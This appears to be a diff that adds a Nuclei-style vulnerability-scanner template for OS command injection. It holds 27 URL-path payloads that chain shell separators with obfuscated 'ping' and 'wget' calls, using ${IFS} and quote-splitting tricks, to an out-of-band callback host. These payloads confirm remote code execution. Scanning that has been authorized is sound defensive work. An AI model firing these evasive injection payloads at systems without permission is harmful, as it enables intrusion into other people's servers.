@@ -1,0 +1,52 @@
+id: os_cmd_inject_rce
+
+info:
+  name: os_cmd_inject_rce 
+  author: raff
+  severity: critical
+  description: rce
+  reference: https://raff
+  metadata:
+    max-request: 27
+  tags: linux,ssrf,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/xx;pin`echo${IFS}g`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx&&pin`echo${IFS}g`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx||pin`echo${IFS}g`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx&pin`echo${IFS}g`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx|pin`echo${IFS}g`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx$(pin`echo${IFS}g`${IFS}{{interactsh-url}})"
+      - "{{BaseURL}}/xx;pi$()ng {{interactsh-url}}"
+      - "{{BaseURL}}/xx&&pi$()ng {{interactsh-url}}"
+      - "{{BaseURL}}/xx||pi$()ng {{interactsh-url}}"
+      - "{{BaseURL}}/xx&pi$()ng {{interactsh-url}}"
+      - "{{BaseURL}}/xx|pi$()ng {{interactsh-url}}"
+      - "{{BaseURL}}/xx`pi$()ng {{interactsh-url}}`"
+      - "{{BaseURL}}/xx$(pi$()ng {{interactsh-url}})"
+      - "{{BaseURL}}/xx;wg`echo${IFS}et`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx&&wg`echo${IFS}et`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx||wg`echo${IFS}et`${IFS}{{interactsh-url}}" 
+      - "{{BaseURL}}/xx&wg`echo${IFS}et`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx|wg`echo${IFS}et`${IFS}{{interactsh-url}}"
+      - "{{BaseURL}}/xx`wg$()et${IFS}{{interactsh-url}}`"
+      - "{{BaseURL}}/xx$(wg`echo${IFS}et`${IFS}{{interactsh-url}})"
+      - "{{BaseURL}}/xx;wg$()et {{interactsh-url}}"
+      - "{{BaseURL}}/xx&&wg$()et {{interactsh-url}}"
+      - "{{BaseURL}}/xx||wg$()et {{interactsh-url}}"
+      - "{{BaseURL}}/xx&wg$()et {{interactsh-url}}"
+      - "{{BaseURL}}/xx|wg$()et {{interactsh-url}}"
+      - "{{BaseURL}}/xx`wg$()et {{interactsh-url}}`"
+      - "{{BaseURL}}/xx$(wg$()et {{interactsh-url}})"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+# digest: 4b0a00483046022100d60dc51cb537067ff6eca1c394ad8c07ba4dbdaadb17984f72000e5993edcccf022100aadc1f2330b9f86addc6ecd8a283f2d57af8da34c7a8a9bea153c92730017824:922c64590222798bb761d5b6d8e72950
